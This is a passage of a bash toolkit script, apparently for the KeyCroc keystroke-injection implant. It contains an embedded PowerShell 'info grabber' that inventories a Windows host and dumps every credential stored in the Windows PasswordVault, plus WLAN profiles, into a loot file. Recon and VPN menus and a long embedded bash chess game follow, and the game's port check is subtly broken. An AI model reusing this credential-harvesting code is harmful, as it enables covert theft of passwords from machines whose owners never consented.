        new-object PSObject -property @{\n      \"LocalAddress\" = \$listenerItem.LocalAddress\n      \"RemoteAddress\" = \$listenerItem.RemoteAddress\n      \"State\" = \$listenerItem.State\n      \"AppliedSetting\" = \$listenerItem.AppliedSetting\n
          \"OwningProcess\" = \$listenerItem.OwningProcess\n      \"ProcessName\" = \$processItem.ProcessName\n    }\n} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table\n\n\$process = \$process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine\n\n\$service = Get-WmiObject Win32_service | select State, Name, DisplayName, PathName, @{Name=\"Sort\";Expression={\$_.State + \$_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName\n
\$software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { \$_.DisplayName -notlike \$null } | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize\n
\$drivers = Get-WmiObject Win32_PnPSignedDriver | where { \$_.DeviceName -notlike \$null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion\n\n\$videocard = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution\n\n[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n\$vault = New-Object Windows.Security.Credentials.PasswordVault\n\$vault = \$vault.RetrieveAll() | % { \$_.RetrievePassword();\$_ }\n
Clear-Host\nWrite-Host\n\n\$computerSystem.Name\n\"${LINE}\"\n\"Manufacturer: \" + \$computerSystem.Manufacturer\n\"Model: \" + \$computerSystem.Model\n\"Serial Number: \" + \$computerBIOS.SerialNumber\n\"\"\n\"\"\n\"\"\n\n\"OS:\"\n\"${LINE}\"+ (\$computerOs | out-string)\n
\"CPU:\"\n\"${LINE}\"+ (\$computerCpu | out-string)\n\n\"RAM:\"\n\"${LINE}\"\n\"Capacity:\" + \$computerRamCapacity+ (\$computerRam | out-string)\n\n\"Mainboard:\"\n\"${LINE}\"+ (\$computerMainboard | out-string)\n\n\"Bios:\"\n\"${LINE}\"+ (Get-WmiObject Win32_bios | out-string)\n\n\"Local-user:\"\n\"${LINE}\"+ (\$luser | out-string)\n\n\"HDDs:\"\n\"${LINE}\"+ (\$Hdds | out-string)\n\n\"COM & SERIAL DEVICES:\"\n\"${LINE}\"+ (\$COMDevices | Out-String)\n\n\"Network:\"\n\"${LINE}\"\n\"Computers MAC address: \" + \$computerMAC\n\"Computers IP address: \" + \$computerIP.ipaddress[0]\n\"Public IP address: \" + \$computerPubIP\n
\"RDP: \" + \$RDP\n\"\"\n(\$Network | out-string)\n\n\"W-Lan profiles:\"\n\"${LINE}\"+ (\$WLANProfileObjects | out-string)\n\n\"listeners / ActiveTcpConnections:\"\n\"${LINE}\"+ (\$listener | out-string)\n\n\"Current running process:\"\n\"${LINE}\"+ (\$process | out-string)\n
\"Services:\"\n\"${LINE}\"+ (\$service | out-string)\n\n\"Installed software:\"\n\"${LINE}\"+ (\$software | out-string)\n\n\"Installed drivers:\"\n\"${LINE}\"+ (\$drivers | out-string)\n\n\"Installed videocards:\"\n\"${LINE}\"+ (\$videocard | out-string)\n
\"Windows/user passwords:\"\n\"${LINE}\"\n\$vault | select Resource, UserName, Password | Sort-Object Resource | ft -AutoSize\n\nRemove-Variable -Name computerPubIP,\ncomputerIP,IsDHCPEnabled,Network,Networks,\ncomputerMAC,computerSystem,computerBIOS,computerOs,
computerCpu, computerMainboard,computerRamCapacity,\ncomputerRam,driveType,Hdds,RDP,WLANProfileNames,WLANProfileName,\nOutput,WLANProfileObjects,WLANProfilePassword,WLANProfileObject,luser,\nprocess,listener,listenerItem,process,service,software,drivers,videocard,\nvault -ErrorAction SilentlyContinue -Force" >> ${WIN_PS_A}
		sleep 1
		start_win_stat | tee ${LOOT_WIND}
		cat ${LOOT_WIND}
	fi ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; windows_check ;;
	esac
else
	echo -ne "\n\e[5m$(ColorRed 'The KeyCroc is not pluged into Windows pc this will not work on this OS')-->$(OS_CHECK)\n"
fi
}
##
#----Croc_Pot_Plus Recon scan main menu
##
MenuTitle RECON SCAN MENU ; MenuColor 21 1 TCPDUMP SCAN MENU ; MenuColor 21 2 NMAP SCAN MENU ; MenuColor 21 3 TRACEROUTE SCAN ; MenuColor 21 4 WHOIS LOOKUP SCAN ; MenuColor 21 5 DNS LOOKUP SCAN
MenuColor 21 6 PING TARGET SCAN ; MenuColor 21 7 NETCAT PORT SCAN ; MenuColor 21 8 SSL/TLS SSLSCAN ; MenuColor 21 9 PHONE NUMBER LOOKUP ; MenuColor 20 10 DNS LEAK TEST
MenuColor 20 11 E-MAIL LEAK TEST ; MenuColor 20 12 PENTMENU RECON MENU ; MenuColor 20 13 WINDOWS INFO GRABBER ; MenuColor 20 14 RETURN TO MAIN MENU ; MenuEnd 24
	case $m_a in
	1) tcpdump_scan ; tcpdump_scan ;; 2) nmap_menu ; croc_recon ;; 3) traceroute_scan ; croc_recon ;; 4) whois_scan ; croc_recon ;; 5) dns_scan ; croc_recon ;; 6) target_ping ; croc_recon ;;
	7) target_port ; croc_recon ;; 8) ssl_scan ; croc_recon ;; 9) phone_lookup ; croc_recon ;; 10) leak_dns ; croc_recon ;;
	11) email_leak ; croc_recon ;; 12) pentmenu ; pentmenu ;; 13) windows_check ; croc_recon ;; 14) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; croc_recon ;;
	esac
}
##
#----VPN SETUP-Start/stop Function
##
function croc_vpn() {
	local vpn_file_A=/etc/openvpn/*.ovpn
	local vpn_file=/root/udisk/*.ovpn
	echo -ne "$(Info_Screen '
-First need to download the (filename.ovpn) file
-From your VPN server of choice
-Place it on the keycroc root of the udisk
-Then select #1 VPN SETUP to do the rest
-Check to see if openvpn is installed')\n"
setup_vpn() {
##
#----VPN Check/install openvpn
##
	install_package openvpn OPENVPN setup_vpn croc_vpn
##
#----VPN user input credentials
##
if [ -f ${vpn_file} ]; then
	echo -ne "\n$(ColorYellow 'FOUND .ovpn FILE MOVING IT TO ect/openvpn')\n"
	find . -name *.ovpn -exec mv '{}' "/etc/openvpn/" ";"
	touch /etc/openvpn/credentials
	read_all ENTER YOUR USER NAME AND PRESS [ENTER] ; echo ${r_a} >> /etc/openvpn/credentials
	user_input_passwd /etc/openvpn/credentials VPN
	sed -i 's/auth-user-pass/auth-user-pass \/etc\/openvpn\/credentials/g' ${vpn_file_A}
	openvpn --config ${vpn_file_A} --daemon
else
	echo -ne "\n${LINE_}\e[5m$(ColorRed 'DID NOT FIND .ovpn FILE ON THE KEYCROC UDISK')${LINE_}\n"
fi
}
##
#----VPN Menu
##
MenuTitle VPN MENU ; MenuColor 19 1 VPN SETUP ; MenuColor 19 2 ENABLE VPN ; MenuColor 19 3 DISABLE VPN ; MenuColor 19 4 VPN STATUS ; MenuColor 19 5 EDIT .OVPN FILE ; MenuColor 19 6 REMOVE VPN FILES ; MenuColor 19 7 RETURN TO MAIN MENU ; MenuEnd 22
	case $m_a in
	1) setup_vpn ; croc_vpn ;; 2) openvpn --config ${vpn_file_A} --daemon ; echo -ne "\n$(ColorGreen 'ENABLE VPN CHECK VPN STATUS')\n" ; croc_vpn ;; 3) killall openvpn ; service openvpn restart ; echo -ne "\n$(ColorRed 'DISABLE VPN CHECK VPN STATUS')\n" ; croc_vpn ;; 4) route -n ; ifconfig ; ip route show ; systemctl status openvpn* ; croc_vpn ;;
	5) nano ${vpn_file_A} ; croc_vpn ;; 6) rm -f ${vpn_file_A} /etc/openvpn/credentials ${vpn_file} ; echo -ne "\n$(ColorRed '.OVPN AND CREDENTIALS FILES HAS BEEN REMOVED')\n" ; croc_vpn ;; 7) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; croc_vpn ;;
	esac
}
##
#----Croc Pot Plus Pass time/games
##
function pass_time() {
	clear
	echo -ne "$(Info_Screen '
-AUTHOR:
-Bernhard Heinloth <bernhard@heinloth.net> (CHESS)
-Kirill Timofeev <kt97679@gmail.com> (TETRIS)
-BruXy Bruchanov <http://bruxy.regnet.cz> (SNAKE)
-Victor Hugo <victorhundo> (MATRIX)
-Thought I would share
-Show the power of the keycroc and bash scripting')\n"
##
#----Pass time Chess
##
chess_game() {
# Chess Bash
# a simple chess game written in an inappropriate language :)
# Copyright (c) 2015 by Bernhard Heinloth <bernhard@heinloth.net>
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
# Default values
local strength=3
local namePlayerA="Player"
local namePlayerB="AI"
local color=true
local colorPlayerA=4
local colorPlayerB=1
local colorHover=4
local colorHelper=true
local colorFill=true
local ascii=false
local warnings=false
local computer=-1
local mouse=true
local guiconfig=false
local cursor=true
local sleep=2
local cache=""
local cachecompress=false
local unicodelabels=true
local port=12433
# internal values
local timestamp=$( date +%s%N )
local fifopipeprefix="/tmp/chessbashpipe"
local selectedX=-1
local selectedY=-1
local selectedNewX=-1
local selectedNewY=-1
local remote=0
local remoteip=127.0.0.1
local remotedelay=0.1
local remotekeyword="remote"
local aikeyword="ai"
local aiPlayerA="Marvin"
local aiPlayerB="R2D2"
local A=-1
local B=1
local originY=4
local originX=7
local hoverX=0
local hoverY=0
local hoverInit=false
local labelX=-2
local labelY=9
type stty >/dev/null 2>&1 && useStty=true || useStty=false
# Choose unused color for hover
while (( colorHover == colorPlayerA || colorHover == colorPlayerB )) ; do
	(( colorHover++ ))
done
# Check Unicode availbility
# We do this using a trick: printing a special zero-length unicode char (http://en.wikipedia.org/wiki/Combining_Grapheme_Joiner) and retrieving the cursor position afterwards.
# If the cursor position is at beginning, the terminal knows unicode. Otherwise it has printed some replacement character.
echo -en "\e7\e[s\e[H\r\xcd\x8f\e[6n" && read -sN6 -t0.1 x
if [[ "${x:4:1}" == "1" ]]; then
	ascii=false
	unicodelabels=true
else
	ascii=true
	unicodelabels=false
fi
echo -e "\e[u\e8\e[2K\r\e[0m\nWelcome to \e[1mChessBa.sh\e[0m - a Chess game written in Bash \e[2mby Bernhard Heinloth, 2015\e[0m\n"
# Print version information
function version() {
	echo "ChessBash 0.4"
}
# Wait for key press
# no params/return
function anyKey() {
	$useStty && stty echo
	echo -e "\e[2m(Press any key to continue)\e[0m"
	read -sN1
	$useStty && stty -echo
}
# Error message, p.a. on bugs
# Params:
#	$1	message
# (no return value, exit game)
function error() {
if $color ; then
	echo -e "\e[0;1;41m $1 \e[0m\n\e[3m(Script exit)\e[0m" >&2
else
	echo -e "\e[0;1;7m $1 \e[0m\n\e[3m(Script exit)\e[0m" >&2
fi
	anyKey
exit 1
}
# Check prerequisits (additional executables)
# taken from an old script of mine (undertaker-tailor)
# Params:
#	$1	name of executable
function require() {
	type "$1" >/dev/null 2>&1 ||
{
	echo "This requires $1 but it is not available on your system. Aborting." >&2
	exit 1
}
}
# Validate a number string
# Params:
#	$1	String with number
# Return 0 if valid, 1 otherwise
function validNumber() {
if [[ "$1" =~ ^[0-9]+$ ]] ; then
	return 0
else
	return 1
fi
}
# Validate a port string
# Must be non privileged (>1023)
# Params:
#	$1	String with port number
# Return 0 if valid, 1 otherwise
function validPort() {
if validNumber "$1" && (( 1 < 65536 && 1 > 1023 )) ; then
	return 0
else
	return 1
fi
}
# Validate an IP v4 or v6 address
# source: http://stackoverflow.com/a/9221063
# Params:
#	$1	IP address to validate
# Return 0 if valid, 1 otherwise
function validIP() {
if [[ "$1" =~ ${validate_ip} ]] ; then
	return 0
else
	return 1
fi
}
# Named ANSI colors
declare -a colors=( "black" "red" "green" "yellow" "blue" "magenta" "cyan" "white" )
# Retrieve ANSI color code from string
# Black and white are ignored!
# Params:
#	$1	Color string
# Return Color code or 0 if not a valid
function getColor() {
local c
for (( c=1; c<7; c++ )) ; do
	local v=${colors[$c]:0:1}
	local i=${1:0:1}
if [[ "${v^^}" == "${i^^}" || "$c" -eq "$i" ]] ; then
	return $c
fi
done
return 0
}
# Check if ai player
# Params:
#	$1	player
# Return status code 0 if ai player
function isAI() {
if (( $1 < 0 )) ; then
	if [[ "${namePlayerA,,}" == "${aikeyword,,}" ]] ; then
		return 0
		else
		return 1
	fi
else
	if [[ "${namePlayerB,,}" == "${aikeyword,,}" ]] ; then
		return 0
	else
		return 1
	fi
fi
}
# Help message
# Writes text to stdout
function help {
	echo
	echo -e "\e[1mChess Bash\e[0m - a small chess game written in Bash"
	echo
	echo -e "\e[4mUsage:\e[0m $0 [options]"
	echo
	echo -e "\e[4mConfiguration options\e[0m"
	echo "    -g         Use a graphical user interface (instead of more parameters)"
	echo
	echo -e "\e[4mGame options\e[0m"
	echo -e "    -a \e[2mNAME\e[0m    Name of first player, \"$aikeyword\" for computer controlled or the"
	echo "               IP address of remote player (Default: $namePlayerA)"
	echo -e "    -b \e[2mNAME\e[0m    Name of second player, \"$aikeyword\" for computer controlled or"
	echo -e "               \"$remotekeyword\" for another player (Default: \e[2m$namePlayerB\e[0m)"
	echo -e "    -s \e[2mNUMBER\e[0m  Strength of computer (Default: \e[2m$strength\e[0m)"
	echo -e "    -w \e[2mNUMBER\e[0m  Waiting time for messages in seconds (Default: \e[2m$sleep\e[0m)"
	echo
	echo -e "\e[4mNetwork settings for remote gaming\e[0m"
	echo -e "    -P \e[2mNUMBER\e[0m  Set port for network connection (Default: \e[2m$port\e[0m)"
	echo -e "\e[1;33mAttention:\e[0;33m On a network game the person controlling the first player / A"
	echo -e "(using \"\e[2;33m-b $remotekeyword\e[0;33m\" as parameter) must start the game first!\e[0m"
	echo
	echo -e "\e[4mCache management\e[0m"
	echo -e "    -c \e[2mFILE\e[0m    Makes cache permanent - load and store calculated moves"
	echo "    -z         Compress cache file (only to be used with -c, requires gzip)"
	echo -e "    -t \e[2mSTEPS\e[0m   Exit after STEPS ai turns and print time (for benchmark)"
	echo
	echo -e "\e[4mOutput control\e[0m"
	echo "    -h         This help message"
	echo "    -v         Version information"
	echo "    -V         Disable VT100 cursor movement (for partial output changes)"
	echo "    -M         Disable terminal mouse support"
	echo "    -i         Enable verbose input warning messages"
	echo "    -l         Board labels in ASCII (instead of Unicode)"
	echo "    -p         Plain ascii output (instead of cute unicode figures)"
	echo "               This implies ASCII board labels (\"-l\")"
	echo "    -d         Disable colors (only black/white output)"
	echo -e "    \e[4mFollowing options will have no effect while colors are disabled:\e[0m"
	echo -e "    -A \e[2mNUMBER\e[0m  Color code of first player (Default: \e[2m$colorPlayerA\e[0m)"
	echo -e "    -B \e[2mNUMBER\e[0m  Color code of second player (Default: \e[2m$colorPlayerB\e[0m)"
	echo "    -n         Use normal (instead of color filled) figures"
	echo "    -m         Disable color marking of possible moves"
	echo
	echo -e "\e[2m(Default values/options should suit most systems - only if you encounter a"
	echo -e "problem you should have a further investigation of these script parameters."
	echo -e "Or just switch to a real chess game with great graphics and ai! ;)\e[0m"
	echo
}
# Parse command line arguments
while getopts ":a:A:b:B:c:P:s:t:w:dghilmMnpvVz" options; do
	case $options in
	a) if [[ -z "$OPTARG" ]]; then
		echo "No valid name for first player specified!" >&2
		exit 1
# IPv4 && IPv6 validation, source: http://stackoverflow.com/a/9221063
		elif validIP "$OPTARG"; then
		remote=-1
		remoteip="$OPTARG"
	else
		namePlayerA="$OPTARG"
	fi ;;
	A) if ! getColor "$OPTARG"; then
		colorPlayerA=$?
	else
		echo "'$OPTARG' is not a valid color!" >&2
		exit 1
	fi ;;
	b) if [[ -z "$OPTARG" ]]; then
		echo "No valid name for second player specified!" >&2
		exit 1
	elif [[ "${OPTARG,,}" == "$remotekeyword" ]]; then
		remote=1
	else
		namePlayerB="$OPTARG"
	fi ;;
	B) if ! getColor "$OPTARG"; then
		colorPlayerB=$?
	else
		echo "'$OPTARG' is not a valid color!" >&2
	exit 1
	fi ;;
	s) if validNumber "$OPTARG"; then
		strength=$OPTARG
	else
		echo "'$OPTARG' is not a valid strength!" >&2
	exit 1
	fi ;;
	P) if validPort "$OPTARG"; then
		port=$OPTARG
	else
		echo "'$OPTARG' is not a valid gaming port!" >&2
		exit 1
	fi ;;
	w) if validNumber "$OPTARG"; then
		sleep=$OPTARG
	else
		echo "'$OPTARG' is not a valid waiting time!" >&2
	exit 1
	fi ;;
	c) if [[ -z "$OPTARG" ]]; then
		echo "No valid path for cache file!" >&2
		exit 1
	else
		cache="$OPTARG"
	fi ;;
	t) if validNumber "$OPTARG" ; then
		computer=$OPTARG
	else
		echo "'$OPTARG' is not a valid number for steps!" >&2
		exit 1
	fi ;;
	d) color=false ;; g) guiconfig=true ;; l) unicodelabels=false ;; n) colorFill=false ;; m) colorHelper=false ;; M) mouse=false ;;
	p) ascii=true ; unicodelabels=false ;; i) warnings=true ;; v) version ;; V) cursor=false ;; z) require gzip ; require zcat ; cachecompress=true ;;
	h) help exit 0 ;; \?) echo "Invalid option: -$OPTARG" >&2 ;;
	esac
done
# get terminal dimension
echo -en '\e[18t'
if read -d "t" -s -t 1 tmp ; then
	termDim=(${tmp//;/ })
	termHeight=${termDim[1]}
	termWidth=${termDim[2]}
else
	termHeight=24
	termWidth=80
fi
# gui config
if $guiconfig ; then
# find a dialog system
if type gdialog >/dev/null 2>&1 ; then
	dlgtool="gdialog"
	dlgh=0
	dlgw=100
elif type dialog >/dev/null 2>&1 ; then
	dlgtool="dialog"
	dlgh=0
	dlgw=0
elif type whiptail >/dev/null 2>&1 ; then
	dlgtool="whiptail"
	dlgh=0
	dlgw=$(( termWidth-10 ))
else
	dlgtool=""
	error "The graphical configuration requires gdialog/zenity, dialog or at least whiptail - but none of them was found on your system. You have to use the arguments to configure the game unless you install one of the required tools..."
fi
# Output the type of the first player in a readable string
	function typeOfPlayerA() {
	if [[ "$remote" -eq "-1" ]]; then
		echo "Connect to $remoteip (Port $port)"
		return 2
	elif isAI $A ; then
		echo "Artificial Intelligence (with strength $strength)"
		return 1
	else
		echo "Human named $namePlayerA"
		return 0
	fi
}
# Output the type of the second player in a readable string
	function typeOfPlayerB() {
	if [[ "$remote" -eq "1" ]]; then
		echo "Host server at port $port"
		return 2
	elif isAI $B ; then
		echo "Artificial Intelligence (with strength $strength)"
		return 1
	else
		echo "Human named $namePlayerB"
		return 0
	fi
}
# Execute a dialog
# Params: Dialog params (variable length)
# Prints: Dialog output seperated by new lines
# Returns the dialog program return or 255 if no dialog tool available
	function dlg() {
	if [[ -n "$dlgtool" ]]; then
		$dlgtool --backtitle "ChessBash" "$@" 3>&1 1>&2 2>&3 | sed -e "s/|/\n/g" | sort -u
		return ${PIPESTATUS[0]}
	else
		return 255
	fi
}
# Print a message box with a warning/error message
# Params:
#	$1	Message
	function dlgerror() {
#TODO: normal error
	dlg --msgbox "$1" $dlgh $dlgw
}
# Start the dialog configuration
# Neither params nor return, this is just a function for hiding local variables!
	function dlgconfig() {
	local option_mainmenu_playerA="First Player"
	local option_mainmenu_playerB="Second Player"
	local option_mainmenu_settings="Game settings"
	local dlg_on="ON"
	local dlg_off="OFF"
	declare -a option_player=( "Human" "Computer" "Network" )
	declare -a option_settings=( "Color support" "Unicode support" "Verbose Messages" "Mouse support" "AI Cache" )
	local dlg_main
	while dlg_main=$(dlg --ok-button "Edit" --cancel-button "Start Game" --menu "New Game" $dlgh $dlgw 0 "$option_mainmenu_playerA" "$(typeOfPlayerA || true)" "$option_mainmenu_playerB" "$(typeOfPlayerB || true )" "$option_mainmenu_settings" "Color, Unicode, Mouse & AI Cache") ; do
		case "$dlg_main" in
# Player A settings
	"$option_mainmenu_playerA" )
		typeOfPlayerA > /dev/null
		local type=$?
		local dlg_player
		dlg_player=$(dlg --nocancel --default-item "${option_player[$type]}" --menu "$option_mainmenu_playerA" $dlgh $dlgw 0 "${option_player[0]}" "$( isAI $A && echo "$option_mainmenu_playerA" || echo "$namePlayerA" )" "${option_player[1]}" "with AI (of strength $strength)" "${option_player[2]}" "Connect to Server $remoteip" )
		case "$dlg_player" in
# Human --> get Name
	*"${option_player[0]}"* )
		[[ "$remote" -eq "-1" ]] && remote=0
		local dlg_namePlayer
		dlg_namePlayer=$(dlg --inputbox "Name of $option_mainmenu_playerA" $dlgh $dlgw "$( isAI $A && echo "$option_mainmenu_playerA" || echo "$namePlayerA" )") && namePlayerA="$dlg_namePlayer"
		;;
# Computer --> get Strength
	*"${option_player[1]}"* )
	[[ "$remote" -eq "-1" ]] && remote=0
		namePlayerA=$aikeyword
		local dlg_strength
	if dlg_strength=$(dlg --inputbox "Strength of Computer" $dlgh $dlgw  "$strength") ; then
	if validNumber "$dlg_strength" ; then
		strength=$dlg_strength
	else
		dlgerror "Your input '$dlg_strength' is not a valid number!"
	fi
	fi ;;
# Network --> get Server and Port
	*"${option_player[2]}"* )
		local dlg_remoteip
	if dlg_remoteip=$(dlg --inputbox "IP(v4 or v6) address of Server" $dlgh $dlgw "$remoteip") ; then
	if validIP "$dlg_remoteip" ; then
		remote=-1
		remoteip="$dlg_remoteip"
		local dlg_networkport
	if dlg_networkport=$(dlg --inputbox "Server Port (non privileged)" $dlgh $dlgw "$port") ; then
	if validPort "$dlg_networkport" ; then
		port=$dlg_networkport
	else
			dlgerror "Your input '$dlg_remoteip' is not a valid Port!"
	fi
	fi
	else
		dlgerror "Your input '$dlg_remoteip' is no valid IP address!"
	continue
	fi
	fi ;;
esac
# Player color
if $color ; then
	local colorlist=""
	local c
for (( c=1; c<7; c++ )) ; do
	colorlist+=" ${colors[$c]^} figures"
done
	local dlg_player_color
if dlg_player_color=$(dlg --nocancel --default-item "${colors[$colorPlayerA]^}" --menu "Color of $option_mainmenu_playerA" $dlgh $dlgw 0 "$colorlist") ; then
	getColor "$dlg_player_color" || colorPlayerA=$?
fi
fi ;;
# Player B settings
"$option_mainmenu_playerB" )
	typeOfPlayerB > /dev/null
	local type=$?
	local dlg_player
	dlg_player=$(dlg --nocancel --default-item "${option_player[$type]}" --menu "$option_mainmenu_playerB" $dlgh $dlgw 0 "${option_player[0]}" "$( isAI $B && echo "$option_mainmenu_playerB" || echo "$namePlayerB" )" "${option_player[1]}" "with AI (of strength $strength)" "${option_player[2]}" "Wait for connections on port $port" )
case "$dlg_player" in
# Human --> get Name
	*"${option_player[0]}"* )
		[[ "$remote" -eq "1" ]] && remote=0
		local dlg_namePlayer
		dlg_namePlayer=$(dlg --inputbox "Name of $option_mainmenu_playerB" $dlgh $dlgw "$( isAI $B && echo "$option_mainmenu_playerB" || echo "$namePlayerB" )") && namePlayerA="$dlg_namePlayer" ;;
# Computer --> get Strength
	*"${option_player[1]}"* )
		[[ "$remote" -eq "1" ]] && remote=0
		namePlayerB=$aikeyword
		local dlg_strength
	if dlg_strength=$(dlg --inputbox "Strength of Computer" $dlgh $dlgw  "$strength") ; then
	if validNumber "$dlg_strength" ; then
		strength=$dlg_strength
	else
		dlgerror "Your input '$dlg_strength' is not a valid number!"
	fi
	fi ;;
# Network --> get Server and Port
	*"${option_player[2]}"* )
		remote=1
		local dlg_networkport
	if dlg_networkport=$(dlg --inputbox "Server Port (non privileged)" $dlgh $dlgw "$port") ; then
	 if validPort "$dlg_networkport" ; then
		port=$dlg_networkport
	else
		dlgerror "Your input '$dlg_remoteip' is not a valid Port!"
	fi
	fi ;;
esac
# Player color
if $color ; then
	local colorlist=""
	local c
for (( c=1; c<7; c++ )) ; do
	colorlist+=" ${colors[$c]^} figures"
done
	local dlg_player_color
	if dlg_player_color=$(dlg --nocancel --default-item "${colors[$colorPlayerB]^}" --menu "Color of $option_mainmenu_playerB" $dlgh $dlgw 0 "$colorlist") ; then
		getColor "$dlg_player_color" || colorPlayerB=$?
fi
fi ;;
# Game settings
	"$option_mainmenu_settings" )
	if dlg_settings=$(dlg --separate-output --checklist "$option_mainmenu_settings" $dlgh $dlgw $dlgw "${option_settings[0]}" "with movements and figures" $($color && echo $dlg_on || echo $dlg_off) "${option_settings[1]}" "optional including board labels" $($ascii && echo $dlg_off || echo $dlg_on) "${option_settings[2]}" "be chatty" $($warnings && echo $dlg_on || echo $dlg_off) "${option_settings[3]}" "be clicky" $($mouse && echo $dlg_on || echo $dlg_off) "${option_settings[4]}" "in a regluar file" $([[ -n "$cache" ]] && echo $dlg_on || echo $dlg_off) ) ; then
# Color support
	if [[ "$dlg_settings" == *"${option_settings[0]}"* ]]; then
		color=true
		dlg --yesno "Enable movement helper (colorize possible move)?" $dlgh $dlgw && colorHelper=true || colorHelper=false
		dlg --yesno "Use filled (instead of outlined) figures for both player?" $dlgh $dlgw && colorFill=true || colorFill=false
	else
		color=false
		colorFill=false
		colorHelper=false
	fi
# Unicode support
	if [[ "$dlg_settings" == *"${option_settings[1]}"* ]]; then
		ascii=false
		( dlg --yesno "Use Unicode for board labels?" $dlgh $dlgw ) && unicodelabels=true || unicodelabels=false
	else
		ascii=true
		unicodelabels=false
	fi
# Verbose messages
[[ "$dlg_settings" == *"${option_settings[2]}"* ]] && warnings=true || warnings=false
# Mouse support
[[ "$dlg_settings" == *"${option_settings[3]}"* ]] && mouse=true || mouse=false
# AI Cache
local dlg_cache
	if [[ "$dlg_settings" == *"${option_settings[4]}"* ]] && dlg_cache=$(dlg --inputbox "Cache file:" $dlgh $dlgw "$([[ -z "$cache" ]] && echo "$(pwd)/chessbash.cache" || echo "$cache")") && [[ -n "$dlg_cache" ]]; then
		cache="$dlg_cache"
		type gzip >/dev/null 2>&1 && type zcat >/dev/null 2>&1 && dlg --yesno "Use GZip compression for Cache?" $dlgh $dlgw && cachecompress=true || cachecompress=false
	else
		cache=""
	fi
# Waiting time (ask always)
local dlg_sleep
	if dlg_sleep=$(dlg --inputbox "How long should every message be displayed (in seconds)?" $dlgh $dlgw "$sleep") ; then
	if validNumber "$dlg_sleep" ; then
		sleep=$dlg_sleep
	else
		dlgerror "Your input '$dlg_sleep' is not a valid number!"
	fi
	fi
	fi ;;
# Other --> exit (gdialog)
	* )
	break ;;
	esac
	done
	}
# start config dialog
	dlgconfig
fi
# Save screen
if $cursor ; then
	echo -e "\e7\e[s\e[?47h\e[?25l\e[2J\e[H"
fi
# lookup tables
declare -A cacheLookup
declare -A cacheFlag
declare -A cacheDepth
# associative arrays are faster than numeric ones and way more readable
declare -A redraw
if $cursor ; then
for (( y=0; y<10; y++ )) ; do
	for (( x=-2; x<8; x++ )) ; do
		redraw[$y,$x]=""
	done
done
fi
declare -A field
# initialize setting - first row
declare -a initline=( 4  2  3  6  5  3  2  4 )
for (( x=0; x<8; x++ )) ; do
	field[0,$x]=${initline[$x]}
	field[7,$x]=$(( (-1) * ${initline[$x]} ))
done
# set pawns
for (( x=0; x<8; x++ )) ; do
	field[1,$x]=1
	field[6,$x]=-1
done
# set empty fields
for (( y=2; y<6; y++ )) ; do
	for (( x=0; x<8; x++ )) ; do
		field[$y,$x]=0
	done
done
# readable figure names
declare -a figNames=( "(empty)" "pawn" "knight" "bishop" "rook" "queen" "king" )
# ascii figure names (for ascii output)
declare -a asciiNames=( "k" "q" "r" "b" "n" "p" " " "P" "N" "B" "R" "Q" "K" )
# figure weight (for heuristic)
declare -a figValues=( 0 1 5 5 6 17 42 )
# Warning message on invalid moves (Helper)
# Params:
#	$1	message
# (no return value)
function warn() {
	message="\e[41m\e[1m$1\e[0m\n"
	draw
}
# Readable coordinates
# Params:
#	$1	row position
#	$2	column position
# Writes coordinates to stdout
function coord() {
	echo -en "\x$((48-$1))$(($2+1))"
}
# Get name of player
# Params:
#	$1	player
# Writes name to stdout
function namePlayer() {
if (( $1 < 0 )) ; then
	if $color ; then
		echo -en "\e[3${colorPlayerA}m"
	fi
	if isAI "$1" ; then
		echo -n "$aiPlayerA"
	else
		echo -n "$namePlayerA"
	fi
else
	if $color ; then
		echo -en "\e[3${colorPlayerB}m"
	fi
	if isAI "$1" ; then
		echo -n "$aiPlayerB"
	else
		echo -n "$namePlayerB"
	fi
fi
if $color ; then
	echo -en "\e[0m"
fi
}
# Get name of figure
# Params:
#	$1	figure
# Writes name to stdout
function nameFigure() {
	if (( $1 < 0 )) ; then
		echo -n "${figNames[$1*(-1)]}"
	else
		echo -n "${figNames[$1]}"
	fi
}
# Check win/loose position
# (player has king?)
# Params:
#	$1	player
# Return status code 1 if no king
function hasKing() {
local player=$1;
local x
local y
for (( y=0;y<8;y++ )) ; do
	for (( x=0;x<8;x++ )) ; do
		if (( ${field[$y,$x]} * player == 6 )) ; then
		return 0
		fi
	done
done
return 1
}
# Check validity of a concrete single movement
# Params:
#	$1	origin Y position
#	$2	origin X position
#	$3	target Y position
#	$4	target X position
#	$5	current player
# Returns status code 0 if move is valid
function canMove() {
	local fromY=$1
	local fromX=$2
	local toY=$3
	local toX=$4
	local player=$5
	local i
	if (( fromY < 0 || fromY >= 8 || fromX < 0 || fromX >= 8 || toY < 0 || toY >= 8 || toX < 0 || toX >= 8 || ( fromY == toY && fromX == toX ) )) ; then
		return 1
	fi
	local from=${field[$fromY,$fromX]}
	local to=${field[$toY,$toX]}
	local fig=$(( from * player ))
	if (( from == 0 || from * player < 0 || to * player > 0 || player * player != 1 )) ; then
		return 1
# pawn
elif (( fig == 1 )) ; then
	if (( fromX == toX && to == 0 && ( toY - fromY == player || ( toY - fromY == 2 * player && ${field["$((player + fromY)),$fromX"]} == 0 && fromY == ( player > 0 ? 1 : 6 ) ) ) )) ; then
		return 0
		else
